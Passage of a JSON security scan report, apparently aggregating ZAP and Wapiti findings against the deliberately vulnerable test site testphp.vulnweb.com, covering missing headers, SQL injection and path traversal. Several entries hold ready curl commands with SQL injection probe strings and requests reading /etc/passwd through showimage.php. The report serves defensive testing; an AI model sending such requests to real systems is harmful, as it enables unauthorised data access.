                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Sec-Fetch-User Header is Missing",
                "risk": "Informational",
                "confidence": "High",
                "description": "Specifies if a navigation request was initiated by a user.",
                "solution": "Ensure that Sec-Fetch-User header is included in user initiated requests.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-User",
                "tags": [
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery",
                    "https://cwe.mitre.org/data/definitions/352.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Missing Anti-clickjacking Header",
                "risk": "Medium",
                "confidence": "Medium",
                "description": "The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.",
                "solution": "Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.\nIf you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's \"frame-ancestors\" directive.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "https://cwe.mitre.org/data/definitions/1021.html",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "X-Content-Type-Options Header Missing",
                "risk": "Low",
                "confidence": "Medium",
                "description": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.",
                "solution": "Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.\nIf possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.",
                "reference": "https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)\nhttps://owasp.org/www-community/Security_Headers",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "https://cwe.mitre.org/data/definitions/693.html",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            }
        ],
        "Wapiti": [],
        "Uncategorized": []
    },
    "Injection Attacks": {
        "Burp Suite": [],
        "ZAP": [
            {
                "alert": "SQL Injection - MySQL",
                "risk": "High",
                "confidence": "Medium",
                "description": "SQL injection may be possible.",
                "solution": "Do not trust client side input, even if there is client side validation in place.\nIn general, type check all data on the server side.\nIf the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'\nIf the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.\nIf database Stored Procedures can be used, use them.\nDo *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!\nDo not create dynamic SQL queries using simple string concatenation.\nEscape all data received from the client.\nApply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.\nApply the principle of least privilege by using the least privileged database user possible.\nIn particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.\nGrant the minimum database access that is necessary for the application.",
                "reference": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                "tags": [
                    "",
                    "https://owasp.org/Top10/A03_2021-Injection/",
                    "https://cwe.mitre.org/data/definitions/89.html",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
                    "",
                    "",
                    "",
                    "",
                    "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html",
                    "",
                    ""
                ],
                "urls": [
                    "http://testphp.vulnweb.com/search.php?test=%27",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/artists.php?artist=%27",
                    "http://testphp.vulnweb.com/listproducts.php?cat=%27",
                    "http://testphp.vulnweb.com/listproducts.php?artist=%27",
                    "http://testphp.vulnweb.com/product.php?pic=%27",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/userinfo.php"
                ]
            }
        ],
        "Wapiti": [
            {
                "method": "GET",
                "path": "/artists.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter artist",
                "level": 4,
                "parameter": "artist",
                "http_request": "GET /artists.php?artist=1%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1%C2%BF%27%22%28\""
            },
            {
                "method": "GET",
                "path": "/listproducts.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter cat",
                "level": 4,
                "parameter": "cat",
                "http_request": "GET /listproducts.php?cat=3%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/listproducts.php?cat=3%C2%BF%27%22%28\""
            },
            {
                "method": "GET",
                "path": "/listproducts.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter artist",
                "level": 4,
                "parameter": "artist",
                "http_request": "GET /listproducts.php?artist=1%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/listproducts.php?artist=1%C2%BF%27%22%28\""
            },
            {
                "method": "GET",
                "path": "/product.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter pic",
                "level": 4,
                "parameter": "pic",
                "http_request": "GET /product.php?pic=6%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/product.php?pic=6%C2%BF%27%22%28\""
            },
            {
                "method": "GET",
                "path": "/search.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter test",
                "level": 4,
                "parameter": "test",
                "http_request": "GET /search.php?test=query%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/search.php?test=query%C2%BF%27%22%28\""
            },
            {
                "method": "POST",
                "path": "/search.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter test",
                "level": 4,
                "parameter": "test",
                "http_request": "POST /search.php?test=query%C2%BF%27%22%28 HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=default&goButton=go",
                "curl_command": "curl \"http://testphp.vulnweb.com/search.php?test=query%C2%BF%27%22%28\" -e \"http://testphp.vulnweb.com/\" -d \"searchFor=default&goButton=go\""
            },
            {
                "method": "POST",
                "path": "/search.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter searchFor",
                "level": 4,
                "parameter": "searchFor",
                "http_request": "POST /search.php?test=query HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=default%C2%BF%27%22%28&goButton=go",
                "curl_command": "curl \"http://testphp.vulnweb.com/search.php?test=query\" -e \"http://testphp.vulnweb.com/\" -d \"searchFor=default%C2%BF%27%22%28&goButton=go\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter uuname",
                "level": 4,
                "parameter": "uuname",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/userinfo.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter uname",
                "level": 4,
                "parameter": "uname",
                "http_request": "POST /userinfo.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/login.php\nContent-Type: application/x-www-form-urlencoded\n\nuname=default%C2%BF%27%22%28&pass=Letm3in_",
                "curl_command": "curl \"http://testphp.vulnweb.com/userinfo.php\" -e \"http://testphp.vulnweb.com/login.php\" -d \"uname=default%C2%BF%27%22%28&pass=Letm3in_\""
            },
            {
                "method": "POST",
                "path": "/userinfo.php",
                "info": "SQL Injection (DMBS: MySQL) via injection in the parameter pass",
                "level": 4,
                "parameter": "pass",
                "http_request": "POST /userinfo.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/login.php\nContent-Type: application/x-www-form-urlencoded\n\nuname=default&pass=Letm3in_%C2%BF%27%22%28",
                "curl_command": "curl \"http://testphp.vulnweb.com/userinfo.php\" -e \"http://testphp.vulnweb.com/login.php\" -d \"uname=default&pass=Letm3in_%C2%BF%27%22%28\""
            }
        ],
        "Uncategorized": []
    },
    "Path Traversal/Manipulation": {
        "Burp Suite": [],
        "ZAP": [],
        "Wapiti": [
            {
                "method": "GET",
                "path": "/showimage.php",
                "info": "Possible fopen() vulnerability via injection in the parameter file",
                "level": 4,
                "parameter": "file",
                "http_request": "GET /showimage.php?file=%2Fetc%2Fpasswd HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/showimage.php?file=%2Fetc%2Fpasswd\""
            },
            {
                "method": "GET",
                "path": "/showimage.php",
                "info": "Possible source code disclosure via injection in the parameter file",
                "level": 4,
                "parameter": "file",
                "http_request": "GET /showimage.php?file=showimage.php HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/showimage.php?file=showimage.php\""
            },
            {
                "method": "GET",
                "path": "/showimage.php",
                "info": "Possible fopen() vulnerability via injection in the parameter file",
                "level": 4,
                "parameter": "file",
                "http_request": "GET /showimage.php?file=%2Fetc%2Fpasswd&size=160 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/showimage.php?file=%2Fetc%2Fpasswd&size=160\""
            },
            {
                "method": "GET",
                "path": "/showimage.php",
                "info": "Possible source code disclosure via injection in the parameter file",
                "level": 4,
                "parameter": "file",
                "http_request": "GET /showimage.php?file=showimage.php&size=160 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/showimage.php?file=showimage.php&size=160\""
            }
        ],
        "Uncategorized": []
    }
}